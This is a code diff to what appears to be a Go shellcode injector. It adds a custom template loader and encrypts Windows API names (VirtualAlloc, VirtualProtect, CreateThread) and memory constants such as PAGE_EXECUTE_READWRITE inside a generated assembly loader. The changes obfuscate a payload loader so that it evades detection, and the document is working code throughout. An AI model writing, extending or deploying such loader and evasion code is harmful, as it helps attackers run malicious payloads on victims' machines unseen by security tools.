@@ -28,11 +28,11 @@ const (
 )
 
 const (
-	paAllocationType = "AllocationType"
-	paProtect        = "Protect"
-	paNewProtect     = "NewProtect"
-	paInfinite       = "Infinite"
-	paFreeType       = "FreeType"
+	acAllocationType = "AllocationType"
+	acProtect        = "Protect"
+	acNewProtect     = "NewProtect"
+	acInfinite       = "Infinite"
+	acFreeType       = "FreeType"
 )
 
 const (
@@ -230,8 +230,12 @@ func (inj *Injector) buildLoaderASM(src string, payload []byte, ins bool) (strin
 	if err != nil {
 		return "", err
 	}
-	inj.encryptStrings(ctx)
-	inj.encryptArguments(ctx)
+	err = inj.loadCustomTemplate(ctx)
+	if err != nil {
+		return "", fmt.Errorf("failed to load custom template: %s", err)
+	}
+	inj.encryptAPINames(ctx)
+	inj.encryptAPIConstants(ctx)
 	// update context
 	hasLoadLibraryA := inj.getProcFromIAT("LoadLibraryA") != nil
 	hasLoadLibraryW := inj.getProcFromIAT("LoadLibraryW") != nil
@@ -479,7 +483,42 @@ func (inj *Injector) getProcFromIAT(proc string) *iat {
 	return nil
 }
 
-func (inj *Injector) encryptStrings(ctx *loaderCtx) {
+func (inj *Injector) loadCustomTemplate(ctx *loaderCtx) error {
+	tpl := inj.opts.Template
+	if tpl == nil {
+		return nil
+	}
+	err := tpl.Check()
+	if err != nil {
+		return err
+	}
+	ctx.CIEnc = make(map[string]uint64)
+	ctx.CIKey = make(map[string]uint64)
+	ctx.CAEnc = make(map[string][]uint64)
+	ctx.CAKey = make(map[string][]uint64)
+	ctx.CWEnc = make(map[string][]uint64)
+	ctx.CWKey = make(map[string][]uint64)
+	for name, value := range tpl.Integer {
+		data, key := inj.encryptValue(value)
+		ctx.CIEnc[name] = data
+		ctx.CIKey[name] = key
+	}
+	for name, value := range tpl.ANSI {
+		data, key := inj.encryptString(value, false)
+		ctx.CAEnc[name] = data
+		ctx.CAKey[name] = key
+	}
+	for name, value := range tpl.UTF16 {
+		data, key := inj.encryptString(value, true)
+		ctx.CWEnc[name] = data
+		ctx.CWKey[name] = key
+	}
+	ctx.Args = tpl.Arguments
+	ctx.Switches = tpl.Switches
+	return nil
+}
+
+func (inj *Injector) encryptAPINames(ctx *loaderCtx) {
 	isUTF16 := ctx.LoadLibraryWOnly
 	ctx.Kernel32DLLDB, ctx.Kernel32DLLKey = inj.encryptString("kernel32.dll", isUTF16)
 	ctx.VirtualAllocDB, ctx.VirtualAllocKey = inj.encryptString("VirtualAlloc", false)
@@ -487,6 +526,23 @@ func (inj *Injector) encryptStrings(ctx *loaderCtx) {
 	ctx.VirtualProtectDB, ctx.VirtualProtectKey = inj.encryptString("VirtualProtect", false)
 	ctx.CreateThreadDB, ctx.CreateThreadKey = inj.encryptString("CreateThread", false)
 	ctx.WaitForSingleObjectDB, ctx.WaitForSingleObjectKey = inj.encryptString("WaitForSingleObject", false)
+}
+
+func (inj *Injector) encryptAPIConstants(ctx *loaderCtx) {
+	for _, item := range [...]struct {
+		name  string
+		value uint32
+	}{
+		{name: acAllocationType, value: 0x3000}, // MEM_RESERVE|MEM_COMMIT
+		{name: acProtect, value: 0x04},          // PAGE_READWRITE
+		{name: acNewProtect, value: 0x40},       // PAGE_EXECUTE_READWRITE
+		{name: acInfinite, value: 0xFFFFFFFF},   // INFINITE
+		{name: acFreeType, value: 0x8000},       // MEM_RELEASE
+	} {
+		data, key := inj.encryptValue(item.value)
+		ctx.PAData[item.name] = data
+		ctx.PAKey[item.name] = key
+	}
 }
 
 func (inj *Injector) encryptString(str string, isUTF16 bool) ([]uint64, []uint64) {
@@ -529,24 +585,7 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]uint64, []uint64
 	return val, key
 }
 
-func (inj *Injector) encryptArguments(ctx *loaderCtx) {
-	for _, item := range [...]struct {
-		name  string
-		value uint32
-	}{
-		{name: paAllocationType, value: 0x3000}, // MEM_RESERVE|MEM_COMMIT
-		{name: paProtect, value: 0x04},          // PAGE_READWRITE
-		{name: paNewProtect, value: 0x40},       // PAGE_EXECUTE_READWRITE
-		{name: paInfinite, value: 0xFFFFFFFF},   // INFINITE
-		{name: paFreeType, value: 0x8000},       // MEM_RELEASE
-	} {
-		data, key := inj.encryptArgument(item.value)
-		ctx.PAData[item.name] = data
-		ctx.PAKey[item.name] = key
-	}
-}
-
-func (inj *Injector) encryptArgument(value uint32) (uint64, uint64) {
+func (inj *Injector) encryptValue(value uint32) (uint64, uint64) {
 	var (
 		val uint64
 		key uint64
